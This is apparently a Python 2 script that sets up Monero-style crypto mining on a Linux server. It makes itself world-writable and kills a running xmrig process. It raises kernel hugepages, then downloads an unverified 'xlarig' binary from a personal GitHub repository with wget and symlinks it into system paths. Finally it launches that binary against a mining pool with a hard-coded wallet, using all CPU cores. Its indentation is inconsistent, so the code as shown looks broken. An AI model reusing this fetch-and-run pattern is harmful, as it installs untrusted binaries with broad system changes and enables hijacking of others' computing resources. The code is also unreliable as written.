__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'xmrig'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count()
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
for x in range(0,3):
  try:
    if os.path.isfile('/usr/local/bin/xmrig') == False:
        #os.system('rm -rf xmrig')
	#os.system ('apt-get update -y')
        #os.system ('apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev')
        #os.system('git clone https://github.com/JayDDee/cpuminer-opt.git --config \'http.proxy=://10.0.0.5:8118' + '\'')
        #os.system ('git clone https://github.com/xmrig/xmrig.git')
        #os.system ('https://github.com/xmrig/xmrig.git')
        #os.chdir('xmrig')
        #os.chdir('xmrig_proxy')
        #os.mkdir ('build')
        #os.chdir('build')
        #os.system ('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a -DWITH_AEON=OFF -DWITH_HTTPD=OFF')
        #os.system ('make')
        os.system('apt-get install -y hwloc')
	      os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xlarig')
	      os.system('chmod 777 xlarig')
        workingdir = os.getcwd()
    	  os.system('ln -s -f ' + workingdir + '/xlarig /usr/local/bin/xlarig')
    	  os.system('ln -s -f ' + workingdir + '/xlarig /usr/bin/xlarig')
        time.sleep (2)
  except:
    pass
#os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
#os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
os.system ('xlarig --donate-level 1 -a defyx -o stratum+tcp://Mine.ScalaProject.io:3333 -u SEiStP7SMy1bvjkWc9dd1t2v1Et5q2DrmaqLqFTQQ9H7JKdZuATcPHUbUL3bRjxzxTDYitHsAPqF8EeCLw3bW8ARe8rYP43BZtL1TXq6Hwg2u+20000 -t ' + str(cores))
